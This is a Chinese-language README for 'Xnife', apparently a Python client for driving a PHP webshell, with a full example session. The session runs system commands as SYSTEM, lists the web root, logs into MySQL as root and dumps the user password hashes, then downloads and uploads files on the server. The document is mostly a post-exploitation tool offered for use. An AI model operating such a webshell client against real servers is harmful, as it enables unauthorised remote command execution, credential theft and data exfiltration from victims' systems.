Xnife X🔪
#author:xbillow

X刀目前只支持后端脚本为php、数据库为mysql的情况。

xnife.py    唯一可执行脚本，主要完成命令交互，调用自己编写的knifelib.py里面的类和函数实现命令执行，文件上传，文件下载，数据库管理
Payloads    payload库，所有的php代码都在这里了
knifelib.py 分3个class分别实现文件管理，命令执行，数据库管理

该程序使用交互执行的方式，可以直接执行系统命令，将文件上传下载分别定义为put和get，数据库管理定义为sql，其他命令都将作为系统命令发送到服务端执行.站在用户的角度看，就是系统命令执行的操作，只是提供了3个内部命令可以传输文件和执行sql语句,所有的sql查询都将产生一个以时间命名的csv文件来记录查询到的数据。

下面是一个例子：


-----------------------------------------------------------------------------------------------------------
PS C:\Users\Cknife> python xnife.py
useage: xnife.py <url> <password>
PS C:\Users\Cknife> python .\xnife.py http://127.0.0.1/testt.php asmin

get <remotePath>                download file from remotePath to current directory.
put <localPath> <remotePath>    uploag file from localPath to remotePath.
sql <host> <user> <passwd>      connect the database by the server.
help                            show this page.
any other system command        execute the command.

xniffe->>
xniffe->>help

get <remotePath>                download file from remotePath to current directory.
put <localPath> <remotePath>    uploag file from localPath to remotePath.
sql <host> <user> <passwd>      connect the database by the server.
help                            show this page.
any other system command        execute the command.

xniffe->>whoami
nt authority\system

[+]Execute successfully!

xniffe->>dir
 驱动器 D 中的卷是 新加卷
 卷的序列号是 B6E2-B7E5

 D:\www 的目录

2018/08/03  14:50    <DIR>          .
2018/08/03  14:50    <DIR>          ..
2018/07/25  20:53               946 1.js
2018/08/03  21:02               559 1.php
2018/07/31  19:51               343 11.php
2018/07/25  11:33               113 172.28.100.92.html
2018/07/25  21:08               943 2.js
2018/07/26  21:20               100 2.php
2018/07/25  16:21               652 add-user.php
2018/07/25  20:58                79 admin.txt
2018/08/01  20:22             2,048 Cknife.db
2018/08/01  20:22         5,178,995 Cknife.jar
2018/07/31  13:31               247 cmd.php
2018/08/01  20:22            33,200 Config.ini
2018/07/28  17:54               883 heapoverflow.html
2018/07/30  18:59            18,061 log.txt
2018/07/25  10:46               238 login.html
2018/07/25  10:46               229 login1.php
2018/07/25  16:12               527 manage-defense.php
2018/07/25  10:47               308 manage.php
2018/07/31  21:42             4,332 PHPerrlogphp_error.log
2018/08/01  14:49           543,853 Sqlmap.png.bak
2018/08/01  08:52           141,828 Sqlmap.txt
2018/08/01  19:58               127 t.py
2018/07/31  17:36                69 test.php
2018/07/27  21:58               479 test2.php
2018/08/01  16:21                34 testt.php
2018/08/03  14:54    <DIR>          yuequan
              25 个文件      5,929,193 字节
               3 个目录 112,861,536,256 可用字节

[+]Execute successfully!

xniffe->>sql
[-]Error:argument too many or too few.

get <remotePath>                download file from remotePath to current directory.
put <localPath> <remotePath>    uploag file from localPath to remotePath.
sql <host> <user> <passwd>      connect the database by the server.
help                            show this page.
any other system command        execute the command.

xniffe->>sql 127.0.0.1 root 526613
You can execute sql now.
xniffe-sql>>
xniffe-sql>>select database()

|     database()    | | |
| information_schema| | |

[+]Execute successfully!

xniffe-sql>>use mysql
Database changed.
xniffe-sql>>select database()

| database()| | |
|   mysql   | | |

[+]Execute successfully!

xniffe-sql>>select user,password,host from user

| user|                  password                |       host     | | |
| root| *1B126DAB7C185C42D26AF5ECDB0ABE292B414D34|    localhost   | | |
| root| *1B126DAB7C185C42D26AF5ECDB0ABE292B414D34| desktop-6obu4bp| | |
| root| *1B126DAB7C185C42D26AF5ECDB0ABE292B414D34|    127.0.0.1   | | |
| root| *1B126DAB7C185C42D26AF5ECDB0ABE292B414D34|       ::1      | | |

[+]Execute successfully!

xniffe-sql>>exit
xniffe->>get 1.php
[+]Download 1.php to ./1.php
xniffe->>get D:\123.png
[+]Download D:\123.png to ./123.png
xniffe->>put 1.php C:\1.php
[+]Upload to C:\1.php.
xniffe->>
xniffe->> 
xniffe->>exit
PS C:\Users\Cknife>
